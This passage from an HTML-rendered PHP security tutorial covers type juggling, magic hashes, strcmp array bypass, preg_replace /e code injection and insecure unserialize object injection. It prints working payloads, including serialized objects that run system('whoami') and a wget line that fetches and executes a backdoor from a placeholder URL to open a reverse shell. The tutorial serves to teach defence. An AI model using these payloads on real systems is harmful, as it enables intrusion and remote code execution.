&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$example_int&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">===&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">int&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>&lt;span style="color:#000">$example_str&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// This condition statement will return True
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#204a87;font-weight:bold">echo&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;This will print.&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="more-php-vulnerabilities">More PHP vulnerabilities&lt;/h1>
&lt;h2 id="magic-hashes">Magic hashes&lt;/h2>
&lt;p>Magic hashes are hashes that start with a leading &lt;code>0e&lt;/code> (the scientific notation for &amp;ldquo;0 to the power of some value&amp;rdquo;) and have only numbers after that.&lt;/p>
&lt;p>Let&amp;rsquo;s say you stored a hashed password that looks like this: &lt;code>0e462097431906509019562988736854&lt;/code>, which is the value returned by &lt;code>md5(240610708)&lt;/code>.
Being a magic hash, if we use the loose comparison operator &lt;code>==&lt;/code> against the user input and provide &lt;code>0&lt;/code> as value, the following code will always return &amp;ldquo;Matched&amp;rdquo;.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$passwordHash&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">md5&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;240610708&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// $_GET[&amp;#39;password&amp;#39;] = &amp;#39;0&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$passwordHash&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#000">$_GET&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">])&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;Matched&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span> &lt;span style="color:#204a87;font-weight:bold">else&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;Not matched&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Below is a table of such hashes discovered so far:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Hash Type&lt;/th>
&lt;th>Hash Length&lt;/th>
&lt;th>&amp;ldquo;Magic&amp;rdquo; Number / String&lt;/th>
&lt;th>Magic Hashes&lt;/th>
&lt;th>Found By&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>md2&lt;/td>
&lt;td>32&lt;/td>
&lt;td>505144726&lt;/td>
&lt;td>0e015339760548602306096794382326&lt;/td>
&lt;td>WhiteHat Security, Inc.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>md4&lt;/td>
&lt;td>32&lt;/td>
&lt;td>48291204&lt;/td>
&lt;td>0e266546927425668450445617970135&lt;/td>
&lt;td>WhiteHat Security, Inc.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>md5&lt;/td>
&lt;td>32&lt;/td>
&lt;td>240610708&lt;/td>
&lt;td>0e462097431906509019562988736854&lt;/td>
&lt;td>Michal Spacek&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>md5&lt;/td>
&lt;td>32&lt;/td>
&lt;td>QNKCDZO&lt;/td>
&lt;td>0e830400451993494058024219903391&lt;/td>
&lt;td>-&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>sha1&lt;/td>
&lt;td>40&lt;/td>
&lt;td>10932435112&lt;/td>
&lt;td>0e07766915004133176347055865026311692244&lt;/td>
&lt;td>Independently found by Michael A. Cleverly &amp;amp; Michele Spagnuolo &amp;amp; Rogdham&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>sha224&lt;/td>
&lt;td>56&lt;/td>
&lt;td>–&lt;/td>
&lt;td>–&lt;/td>
&lt;td>–&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>sha256&lt;/td>
&lt;td>64&lt;/td>
&lt;td>–&lt;/td>
&lt;td>–&lt;/td>
&lt;td>–&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>sha384&lt;/td>
&lt;td>96&lt;/td>
&lt;td>–&lt;/td>
&lt;td>–&lt;/td>
&lt;td>–&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>sha512&lt;/td>
&lt;td>128&lt;/td>
&lt;td>–&lt;/td>
&lt;td>–&lt;/td>
&lt;td>–&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ripemd128&lt;/td>
&lt;td>32&lt;/td>
&lt;td>315655854&lt;/td>
&lt;td>0e251331818775808475952406672980&lt;/td>
&lt;td>WhiteHat Security, Inc.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ripemd160&lt;/td>
&lt;td>40&lt;/td>
&lt;td>20583002034&lt;/td>
&lt;td>00e1839085851394356611454660337505469745&lt;/td>
&lt;td>Michael A Cleverly&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>Even though you won&amp;rsquo;t find such examples on a daily basis, it&amp;rsquo;s important to know that there is such a possibility and beware of using loose comparison.
It&amp;rsquo;s just another example of how dangerous it is.&lt;/p>
&lt;h2 id="bypassing-strcmp-function">Bypassing &lt;code>strcmp()&lt;/code> function&lt;/h2>
&lt;p>The &lt;code>strcmp($str1, $str2)&lt;/code> function compares two strings.
The only possible return values are:&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>0&lt;/strong>, if &lt;code>$str1&lt;/code> is equal to &lt;code>$str2&lt;/code>
&lt;strong>&amp;lt; 0&lt;/strong>, if &lt;code>$str1&lt;/code> is less than &lt;code>$str2&lt;/code>
&lt;strong>&amp;gt; 0&lt;/strong>, if &lt;code>$str1&lt;/code> is greater than &lt;code>$str2&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>But what happens if we use the following code to check for a password?&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">strcmp&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$password&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">$_POST&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">])&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$success&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#204a87;font-weight:bold">true&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span> &lt;span style="color:#204a87;font-weight:bold">else&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$success&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#204a87;font-weight:bold">false&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We could provide an array in the POST parameter instead of a string (&lt;code>password[]=x&lt;/code>), resulting in PHP throwing a warning:&lt;/p>
&lt;p>&lt;code>Warning: strcmp() expects parameter 2 to be string, array given in http://example.com/index.php on line 5&lt;/code>&lt;/p>
&lt;p>The interesting part here is that, even though PHP throws a warning, it goes on comparing the result of &lt;code>strcmp()&lt;/code>, which is &lt;code>NULL&lt;/code>, to &lt;code>0&lt;/code> using the previously discussed loose comparison operator.
This means that &lt;code>NULL&lt;/code> will be equal to &lt;code>0&lt;/code> and so we could bypass the authentication.&lt;/p>
&lt;h2 id="using-preg_replace-to-execute-commands">Using &lt;code>preg_replace()&lt;/code> to execute commands&lt;/h2>
&lt;p>The &lt;code>preg_replace()&lt;/code> function is used to perform regular expressions search and replace.
A legitimate use of it could be:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$in&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#39;Somewhere, something incredible is waiting to be known&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">echo&lt;/span> &lt;span style="color:#000">preg_replace&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$_GET&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;replace&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#000">$_GET&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;with&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#000">$in&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The code will take a user-supplied regular expression and replace whatever it matches with a user-supplied string.
So if we were to call &lt;code>preg_replace.php?replace=/Known/i&amp;amp;with=eaten&lt;/code>, the script would perform a case-insensitive regex search (the &lt;code>i&lt;/code> modifier) and echo &lt;code>Somewhere, something incredible is waiting to be eaten&lt;/code>.
Seems safe enough, right?&lt;/p>
&lt;p>Well, not at all.
The above code is vulnerable to code injection as it fails to account for dangerous &lt;a href="https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php">PCRE modification flags&lt;/a> in the input string.
Most modifiers are quite harmless and let you do things like case-insensitive and multi-line searches, however one modifier, &lt;code>e&lt;/code> will cause PHP to execute the result of the &lt;code>preg_replace()&lt;/code> operation as PHP code.&lt;/p>
&lt;p>The payload is: &lt;code>?replace=/Known/e&amp;amp;with=system(‘whoami’)&lt;/code>&lt;/p>
&lt;p>This is extremely dangerous, as it gives an attacker the opportunity to execute any PHP code.&lt;/p>
&lt;p>It has been &lt;strong>deprecated&lt;/strong> since &lt;strong>PHP 5.5.0&lt;/strong>, and &lt;strong>removed completely&lt;/strong> in &lt;strong>PHP 7.0.0&lt;/strong>, because of its recklessly insecure nature.
The replacement function is called &lt;code>preg_replace_callback()&lt;/code>, which uses a callback.
As many people are still using older versions of PHP, it is still dangerous and even in the versions where it was deprecated, the option will still work (it will generate a warning at a log level turned off by default), so the issue will be around for a while yet.&lt;/p>
&lt;h1 id="php-object-injection--php-insecure-object-deserialization">PHP Object Injection / PHP Insecure Object Deserialization&lt;/h1>
&lt;p>&lt;strong>PHP Object Injection&lt;/strong> is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context.
The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the &lt;code>unserialize()&lt;/code> PHP function.
Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable &lt;code>unserialize()&lt;/code> call, resulting in an arbitrary PHP object(s) injection into the application scope.&lt;/p>
&lt;p>In order to go further, we need to know some things about &lt;strong>PHP magic methods&lt;/strong>.
The &amp;ldquo;magic&amp;rdquo; methods are nothing more than a set of special named functions, starting with two underscores, which denote methods that will be triggered in response to particular PHP events.
A well known example, which you should be familiar with from other programming languages, is the &lt;code>__construct()&lt;/code> method, which is a class constructor.&lt;/p>
&lt;p>The following magic methods will be helpful in exploiting a PHP Object injection vulnerability:&lt;/p>
&lt;ul>
&lt;li>&lt;code>__wakeup()&lt;/code> - when an object is unserialized.&lt;/li>
&lt;li>&lt;code>__destruct()&lt;/code> - when an object is deleted.&lt;/li>
&lt;li>&lt;code>__toString()&lt;/code> - when an object is converted to a string.&lt;/li>
&lt;/ul>
&lt;p>A more comprehensive list of PHP magic methods would be this one:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>&lt;/th>
&lt;th>&lt;/th>
&lt;th>&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;code>__construct()&lt;/code>&lt;/td>
&lt;td>&lt;code>__set()&lt;/code>&lt;/td>
&lt;td>&lt;code>__toString()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>__destruct()&lt;/code>&lt;/td>
&lt;td>&lt;code>__isset()&lt;/code>&lt;/td>
&lt;td>&lt;code>__invoke()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>__call()&lt;/code>&lt;/td>
&lt;td>&lt;code>__unset()&lt;/code>&lt;/td>
&lt;td>&lt;code>__set_state()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>__callStatic()&lt;/code>&lt;/td>
&lt;td>&lt;code>__sleep()&lt;/code>&lt;/td>
&lt;td>&lt;code>__clone()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>__get()&lt;/code>&lt;/td>
&lt;td>&lt;code>__wakeup()&lt;/code>&lt;/td>
&lt;td>&lt;code>__debugInfo()&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="exploit-with-the-__wakeup-in-the-unserialize-function">Exploit with the &lt;code>__wakeup&lt;/code> in the &lt;code>unserialize()&lt;/code> function&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">class&lt;/span> &lt;span style="color:#000">PHPObjectInjection&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">public&lt;/span> &lt;span style="color:#000">$inject&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">function&lt;/span> &lt;span style="color:#000">__construct&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">function&lt;/span> &lt;span style="color:#000">__wakeup&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">isset&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$this&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&amp;gt;&lt;/span>&lt;span style="color:#c4a000">inject&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">eval&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$this&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">-&amp;gt;&lt;/span>&lt;span style="color:#c4a000">inject&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">isset&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$_REQUEST&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]))&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$var1&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">unserialize&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$_REQUEST&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">is_array&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$var1&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;&amp;lt;br/&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span> &lt;span style="color:#000">$var1&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span> &lt;span style="color:#4e9a06">&amp;#34; - &amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span> &lt;span style="color:#000">$var1&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span> &lt;span style="color:#204a87;font-weight:bold">else&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span> &lt;span style="color:#8f5902;font-style:italic"># nothing happens here
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Payload:&lt;/p>
&lt;pre tabindex="0">&lt;code># Basic serialized data
a:2:{i:0;s:4:&amp;#34;XVWA&amp;#34;;i:1;s:33:&amp;#34;Xtreme Vulnerable Web Application&amp;#34;;}
# Command execution
O:18:&amp;#34;PHPObjectInjection&amp;#34;:1:{s:6:&amp;#34;inject&amp;#34;;s:17:&amp;#34;system(&amp;#39;whoami&amp;#39;);&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>This vulnerability is &lt;strong>extremely dangerous&lt;/strong>, as it could also lead to an &lt;strong>RCE (Remote Code Execution)&lt;/strong> exploit.
An attacker could use a payload which downloads a script and starts a reverse shell connected to the web server.
The payload could look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">class&lt;/span> &lt;span style="color:#000">PHPObjectInjection&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// Change URL/ filename to match your setup
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#204a87;font-weight:bold">public&lt;/span> &lt;span style="color:#000">$inject&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;system(&amp;#39;wget http://URL/backdoor.txt -O phpobjbackdoor.php &amp;amp;&amp;amp; php phpobjbackdoor.php&amp;#39;);&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">echo&lt;/span> &lt;span style="color:#000">urlencode&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">serialize&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#204a87;font-weight:bold">new&lt;/span> &lt;span style="color:#000">PHPObjectInjection&lt;/span>&lt;span style="color:#000;font-weight:bold">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Of course, there are many other methods to achieve a reverse shell once you have the ability to execute code on the target machine.&lt;/p>
&lt;h3 id="authentication-bypass---type-juggling">Authentication bypass - Type juggling&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">include&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;credentials.php&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8f5902;font-style:italic">// $adminName = &amp;#34;random&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span> &lt;span style="color:#8f5902;font-style:italic">// $adminPassword = &amp;#34;pass&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">$data&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">unserialize&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">$_COOKIE&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;auth&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
